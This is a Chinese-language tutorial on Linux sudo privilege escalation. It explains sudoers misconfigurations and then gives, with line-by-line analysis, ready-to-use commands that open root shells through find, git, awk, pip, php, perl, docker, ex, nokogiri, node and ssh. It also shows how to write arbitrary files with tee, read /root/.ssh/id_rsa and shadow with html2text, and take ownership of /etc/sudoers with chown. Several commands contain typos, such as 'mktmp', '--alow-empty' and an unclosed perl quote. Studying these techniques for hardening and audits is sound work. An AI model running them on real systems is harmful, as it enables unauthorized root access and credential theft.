# sudo介绍

sudo是linux和unix系统中用于临时提升权限的命令，允许普通用户以超级用户（root）或其他用户的身份执行命令



# sudo提权介绍

NOPASSWD配置不当：如果用户在/etc/sudoers中被配置为无需密码即可执行某些命令（如sudo -l显示NOPASSWD），即可利用这些无需密码的命令提权



如果已经取得当前用户的密码，也可以通过其配置的sudo命令来提权



如果/etc/sudoers文件可读写，也可以通过修改配置文件提权



如果用户以root权限执行某个脚本，并且该脚本可写，可以通过修改脚本内容提权



# 配置文件

通过 /etc/sudoers文件配置哪些用户可以使用sudo，以及通过sudo执行那些命令

语法：

```
<username> ALL=(ALL:ALL) ALL
```

允许用户以sudo执行所有命令

```
<%group> ALL=(ALL:ALL) ALL
```

允许用户组以sudo执行所有命令

```
<username> ALL=(ALL) NOPASSWD: /path/<command>
```

允许用户以sudo执行的命令

sudo会记录用户执行的命令，便于审计和追踪

执行sudo命令时，通常需要用户密码



# 常见用法

```
sudo -l
```

查看当前用户的sudo权限



```
sudo <command>
```

以sudo执行命令



```
sudo -u <username> <command>
```

以其他用户身份执行命令（通常适用于执行非root用户的sudo命令）





# 命令

## find

```
sudo find . -exec /bin/sh \; -quit
```

### 分析

将find命令和-exec操作结合，来查找当前目录下的文件并对每个文件执行/bin/sh

-exec /bin/sh \; 解析：

- -exec 是 find 命令的一个选项，用来对每个符合条件的文件执行一个外部命令

- /bin/sh 是要执行的命令，这里执行的是系统上默认的shell /bin/sh

- \; 用来结束-exec 选项中的命令。由于分号 ； 在shell中是特殊字符，所以需要用反斜杠 \ 来转义它

### 功能

从当前目录开始，递归的搜索所有文件和子目录

对每个找到的文件执行/bin/sh

因为是以sudo执行的find，意味着它将以文件的所有者（通常为root）身份执行/bin/sh。这时，这个命令的行为就不止是打开一个普通的shell，它将一root权限执行/bin/sh，这就能为用户提供一个具有root权限的交互式shell





## git

### 1

```
sudo PAGER='sh -c "exec sh 0<&1"' git -p help
```

#### 分析：

sudo git -p help：

- 以root身份执行git -p help

- git -p help用于显示帮助信息
  - -p参数表示调用分页程序来显示帮助信息（默认情况下会使用PAGER环境变量指定的程序）

PAGER='sh -c "exec sh 0<&1"'：

- PAGER是一个环境变量，通常用于指定分页程序（例如less或more），用于显示长文本内容
  - 在这里，PAGER被设置为 sh -c "exec sh 0<&1"，这意味着git调用分页程序时，实际会执行sh（即启动一个shell）。
    - sh -c "exec sh 0<&1"的作用是启动一个交互式的shell，并将输入输出重定向到当前终端（0<&1表示将标准输入重定向到标准输出）

#### 攻击过程：

- 用户通过sudo执行git -p help，此时git以root权限运行

- git在显示帮助信息时，会调用PAGER环境变量指定的程序

- 由于PAGER被设置为sh -c "exec sh 0<&1"，这实际上会启动一个shell

- 该shell会继承git权限，即以root权限执行



### 2

```
sudo git -p help config
!/bin/sh
```

#### 命令分析：

sudo git -p help config：

- 以root身份执行git -p help config

git -p help config调用了git的help子命令，显示config相关的帮助信息 

- -p参数执行使用的分页程序（如less）来显示帮助信息

!/bin/sh：

- 这是分页程序（如less）中的一个特性，称为命令模式

- 在分页程序中，输入 ! 后可以执行shell命令
  - !/bin/sh即在分页程序中启动一个shll

#### 攻击过程

- 用户通过sudo执行git -p help config，此时git以root权限运行

- git调用默认的分页程序（如less）来显示帮助信息
- 在分页程序中，用户输入!/bin/sh启动一个shell
- 由于git是以root权限执行的，分页程序及其子进程（如sh）也会继承root权限

#### 依赖条件

- git必须支持-p参数，调用分页程序
- 默认分页程序（如less）必须支持命令模式（即 ! 后执行命令）



### 3

```
sudo git branch --help config
!/bin/sh
```

#### 命令分析

sudo git branch --help config

- 以root身份执行git branch --help config

- git branch --help config调用了git的branch子命令，并显示与config相关的帮助信息

  - --help参数：显示指定命令的帮助信息

  - config：作为branch子命令的参数传递给帮助系统

!/bin/sh：

- 这是分页程序（如less）中的一个特性，称为命令模式

- 在分页程序中，输入 ! 后可以执行shell命令
  - !/bin/sh即在分页程序中启动一个shell

#### 攻击过程

- 用户通过sudo执行git branch --help config，此时git以root权限运行

- git调用默认的分页程序（如less）来显示帮助信息
- 在分页程序中，用户输入!/bin/sh启动一个shell
- 由于git是以root权限执行的，分页程序及其子进程（如sh）也会继承root权限

#### 依赖条件

- git必须支持--help参数，调用分页程序
- 默认分页程序（如less）必须支持命令模式（即 ! 后执行命令）



### 4

```
TF=$(mktmp -d)
git init "$TF"
echo 'exec /bin/sh 0<&2 1>&2' > "$TF/.git/hooks/pre-commit.sample"
mv "$TF/.git/hooks/pre-commit.sample" "$TF/.git/hooks/pre-commit"
sudo git -C "$TF" commit --alow-empty -m x
```

#### 描述

利用Git Hooks实现提权的方法。Git Hoots是Git仓库中的脚本，在特定事件（如提交，推送等）发生时自动执行。通过滥用pre-commit钩子，攻击者可以在执行git commit时触发一个shell，从而实现权限提升

#### 核心思路

- Git Hooks时Git仓库中的脚本，位于 .git/hooks目录下

- 当特定事件发生时（如提交，推送等），Git会自动执行对应的钩子脚本
- 如果攻击者能够修改或创建钩子脚本（如pre-commit），并在其中启动一个shell，那么当用户执行相关Git操作时，恶意代码就会以当前用户的权限执行，sudo执行，root权限

#### 命令分析

TF=$(mktmp -d)

- 创建一个临时目录，并将其路径存储在变量TF中

git init "$TF"

- 在临时目录中初始化一个新的Git仓库

echo 'exec /bin/sh 0<&2 1>&2' > "$TF/.git/hooks/pre-commit.sample"

- 在.git/hooks/目录下创建一个pre-commit.sample文件，内容为exec / bin/sh 0<&2 1>&2
  - exec /bin/sh：启动一个shell
  - 0<&2 1>&2：将标准输入和标准输出重定向到标准错误，确保shell能够与终端交互

mv "$TF/.git/hooks/pre-commit.sample" "$TF/.git/hooks/pre-commit"

- 将pre-commit.sample重命名为pre-commit，使其成为有效的Git Hook脚本

sudo git -C "$TF" commit --alow-empty -m x

- 通过sudo执行git commit命令
  - -C $TF：指定Git仓库的路径为临时目录
  - --alow-empty：允许空提交（即不更改任何文件）
  - -m x：提交信息为x
- 当git commit执行时，pre-commit钩子脚本会被触发，启动一个root权限的shell

#### 攻击过程

- 攻击者创建一个临时目录并初始化一个Git仓库
- 攻击者在.git/hooks目录下创建一个恶意pre-commit钩子脚本，内容为启动一个shell
- 攻击者通过sudo执行git commit，触发pre-commit钩子脚本
- 由于git commit是以root权限运行的，启动的shell也会继承root权限

#### 依赖条件

- 攻击者必须能够创建或修改Git仓库中的钩子脚本
- 目标系统未对Git Hooks的行为进行限制（例如未禁用钩子脚本的执行）



### 5

```
TF=$(mktemp -d)
ln -s /bin/sh "$TF/git-x"
sudo git "--exec-path=$TF"x
```

#### 描述

利用Git的--exec参数和符号链接实现提权

#### 核心思路

- Git的--exec-path参数用于指定Git执行程序的路径
- 如果攻击者能够控制--exec-path指向的目录，并在其中防止恶意符号链接，那么当git尝试执行某个子命令时，实际会执行符号链接指向的程序。
- 通过将符号链接执行/bin/sh，攻击者可以在执行git命令时启动一个shell

#### 命令分析

TF=$(mktemp -d)

- 创建一个临时目录，并将其路径存储在变量TF中

ln -s /bin/sh "$TF/git-x"

- 在临时目录中创建一个符号链接git-x，指向/bin/sh
  - ln -s：创建符号链接
  - /bin/sh：目标程序，即shell
  - "$TF/git-x"：符号链接的路径

sudo git "--exec-path=$TF"x

- 通过sudo以root权限执行git命令
  - --exec-path=$TF：指定Git执行程序的路径为临时目录。
  - x：尝试执行一个不存在的Git子命令x
- 当git尝试执行子命令x时，会在--exec-path指定的目录中查找对应程序
- 由于临时目录中存在符号链接git-x，git会执行/bin/sh，从而启动一个root权限的shell

#### 攻击过程

- 攻击者创建一个临时目录

- 攻击者在临时目录中创建一个符号链接git-x，指向/bin/sh
- 攻击者通过sudo执行git --exec-path=$TF x，指定Git执行程序的路径为临时目录
- 当git尝试执行子命令x时，会查找临时目录中的git-x程序
- 由于git-x是一个符号链接，指向/bin/sh，git会启动一个shell

#### 依赖条件

- 攻击者必须能够控制--exec-path参数指向的目录
- 目标系统未对--exec-path参数进行严格限制





## tee

```
LFILE=file_to_write
echo DATA | sudo tee -a "LFILE"
```

#### 描述：

利用tee命令实现任意文件写入

#### 核心思路：

- tee常用来读取标准输入并将其写入标准输出和文件
- 通过以sudo执行tee命令，攻击者可以将数据写入本来没有权限修改的文件

#### 命令分析：

- LFILE=file_to_write
  - 定义LFILE变量，表示要写入的文件名
- echo DATA
  - 输出字符串
- sudo tee -a "LFILE"
  - 以超级用户权限利用tee命令将DATA内容写入文件，-a选项表示将数据追加到指定文件





## awk

```
sudo awk 'BEGIN {system("/bin/sh")}'
```

#### 描述：

通过awk启动一个具有超级用户权限的shell

##### 核心思路：

- 利用awk的system()函数执行任意命令
- 通过执行/bin/sh，攻击者可以启动一个具有超级用户权限的shell

#### 命令分析：

- 'BEGIN {system("/bin/sh")}'

  - BEGIN是awk的一个特殊模式，表示在处理任何输入之前执行的操作

- system("/bin/sh")

  - 调用系统命令/bin/sh，启动一个超级用户的shell





## pip提权

```
TF=$(mktemp -d)
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
sudo pip install $TF
```

### 描述：

利用pip install安装一个恶意的包，并在安装过程以root权限执行反弹shell

### 核心思路：

- 利用setup.py的执行
  - pip install安装包时会自动运行setup.py，而sudo赋予其root权限，因此可以在安装过程中执行任意恶意代码
- 交互式的shell
  - 通过绑定tty，攻击者可以直接在当前终端获得root shell，而无需反弹到远程服务器

### 命令分析：

- TF=$(mktemp -p)

  - 使用mktemp -d创建一个临时目录，并将路径存储在变量TF中
  - 目的是为后续创建恶意包提供临时的工作目录

- echo "import os;os.execl('/bin/sh','sh','-c','sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py

  - 在临时目录下创建一个setup.py文件，这是python包安装时的标准脚本

    ```
    import os
    os.execl('/bin/sh'.'sh','-c','sh <$(tty) > >$(tty) 2>$(tty)')
    ```

    - os.execl：
      - 替换当前进程的执行映像为指定的命令（这里是/bin/sh）
    - sh <$(tty) >$(tty) 2>$(tty)：
      - 启动一个交互式的shell，将输入输出错误都绑定到当前终端（tty）
      - 确保攻击者在安装过程中直接获得一个交互式的shell

- sudo pip install $TF

  - 以root权限运行pip install ，安装临时目录$TF中的包
  - pip install 在安装本地目录时会执行setup.py
  - 因为是用sudo执行，setup.py中的代码将以root权限运行，触发os.execl启动的shell也具有root权限




## php提权

```
CMD="/bin/bash"
sudo php -r "system('$CMD');"
```

### 描述

利用php的system()函数执行shell命令的提权方式

### 命令分析：

- CMD="/bin/sh"

  - 定义一个shell变量CMD，其值为/bin/sh
  - 作用：指定要执行的命令是一个shell

- sudo php -r "system('$CMD');"

  - php -r：运行一行PHP代码，-r表示直接执行指定的PHP脚本字符串。

  - "system('$CMD');"：PHP代码，使用system()函数执行变量$CMD的内容（即/bin/sh）

  - 作用：通过PHP调用系统命令/bin/sh，并将结果输出

    

​	

## Perl提权

```
sudo perl -e 'exec "/bin/sh";
```

### 描述

利用perl脚本提权的一种方式

### 命令分析：

- perl -e：
  - perl是Perl解释器的命令
  - -e：表示直接执行一行Perl代码（而不是从文件读取脚本）
  - 作用：允许在命令行中运行指定的Perl代码
- 'exec "/bin/sh";'：
  - '……'：是Perl代码的单引号包裹内容。
  - exec是Perl的一个函数，用于直接执行系统命令并替换当前进程。
  - "/bin/sh"是要执行的命令，表示启动一个shell
  - 作用：用/bin/sh替换当前的Perl进程，启动一个shell





## docker提权

```
sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

### 描述

利用Docker容器实现提权的一种方法。

### 命令分析：

- docker run：
  - 启动一个新的Docker容器
  - 作用：创建并运行一个基于指定镜像的容器
- -v /:/mnt：
  - -v是Docker的卷挂载选项，用于将宿主机的目录挂载到容器内。
  - /:/mnt：将宿主机的根目录挂载到容器的/mnt目录
  - 作用：容器可以直接访问宿主机的整个文件系统
- --rm：
  - 在容器推出后自动删除容器
  - 作用：清理临时容器，避免留下痕迹
- -it：
  - -i：保持标准输入（stdin）开放，允许交互
  - -t：分配一个伪终端（TTY），提供交互式的shell
  - 作用：确保容器启动后可以交互式操作
- alpine：
  - 指定使用的Docker镜像为alpine，一个轻量级的linux发行版。
  - 作用：提供一个小型干净的运行环境
- chroot /mnt sh：
  - chroot /mnt：将根目录切换到/mnt，即宿主机的/（因为-v /:/mnt）
  - sh：在新的根目录下启动一个shell
  - 作用：在宿主机的文件系统环境下运行shell





## html2text

```
sudo html2text /root/.ssh/id_rsa
```

### 描述

利用html转文本工具实现任意文件读取

读取root用户私钥，从而实现免密登录

读取shadow文件，从而爆破root密码



## ex

```
sudo ex
!/bin/sh
```

### 描述

利用ex开启文本编辑器，并在ex中运行shell





## nokogiri

```
vim 1
123
```

创建一个文档

```
sudo nokogiri 1
system"/bin/sh"
```

利用nokogiri解析文档

### 描述

利用noko解析一个文档，并开启一个交互式的ruby会话，通过该ruby会话开启一个shell

### 命令分析：

- vim 1 
  - 创建一个文件，内容和文件名不限
- sudo nokogiri 1
  - 以root身份运行nokogiri，并解析文件1
- system"/bin/sh"
  - 在解析过程中，nokogiri会开启一个ruby会话，通过ruby会话中的system方法调用/bin/sh，即开启一个shell
  - 作用：启动一个具有root权限的shell，实现提权





## chown

```
LFILE=file_to_change
sudo chown $(id -un):$(id -gn) $LFILE
```

描述通过更改文件的所有权，间接实现提权

如：修改/etc/sudoers

修改/etc/passwd等

### 命令分析：

- LFILE=file_to_change
  - 确定要修改的文件
- $(id -un)
  - 返回当前用户的用户名
  - 作用：动态获取当前用户的用户名，并将其作为chown的目标用户
- $(id -gn)
  - 返回当前用户的主组名
  - 作用：动态获取当前用户的主组名，并将其作为chown的目标组
- $LFILE
  - 目标文件，表示要更改所有权的文件



## node

```
sudo node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
```

### 描述

利用 sudo和Node.js的 child_process 模块以root权限启动交互式 shell

### 命令分析：

- node
  - Node.js的命令行工具，用于运行JavaScript代码
  - 作用：执行后面指定的JavaScript表达式
- -e
  - Node.js选项，表示直接在命令行中执行指定的JavaScript代码
- require("child_process").spawn("/bin/sh",{stdio:[0,1,2]})
  - 利用Node.js的child_process模块启动一个子进程
    - require("child_porcess")
      - 加载Node.js的child_process模块，用于执行系统命令或创建子进程
    - .spawn("/bin/sh")
      - 启动一个新的进程，运行/bin/sh
    - {stdio:[0,1,2]}
      - 配置子进程的标准输入输出
        - stdio是标准输入输出（stdin，stdout，stderr）的配置
        - [0,1,2]表示将子进程的stdin，stdout，stderr分别绑定到父进程的stdin(0)，stdout(1)，stderr(2)，即终端的输入输出
      - 作用：启动一个交互式的shell，并将其输入输出连接到当前终端





## ssh

```
sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
```

### 描述

利用 ssh 的 ProxyCommand 选项绕过常规连接逻辑，直接执行 shell，从而实现提权。

### 命令解析：

- ssh

  - Secure Shell客户端，用于远程登陆或执行命令
  - 作用：用作执行自定义命令的载体

- -o ProxyCommand=';sh 0<&2 1>&2'

  - -o
    - 指定ssh选项
  - ProxyCommand
    - 定义一个自定义命令，通常用于指定代理连接，但在本例中被滥用

- ‘;sh 0<&2 1>&2'

  - ;
    - 分号，表示前一个命令结束后执行后续命令

  - sh
    - 启动一个shell（通常是/bin/sh）
  - 0<&2
    - 将文件描述符（标准输入stdin）重定向到文件描述符2（stderr）
  - 1>&2
    - 将文件描述符1（标准输出stdout）重定向到文件描述符2（标准错误stderr）
    - 作用：启动一个shell，并将其输入输出绑定到终端的标准错误流，形成交互环境。

- x

  - 作用：占位符，实际执行该命令时不需要有效的目标，因为ProxyCommand会直接运行
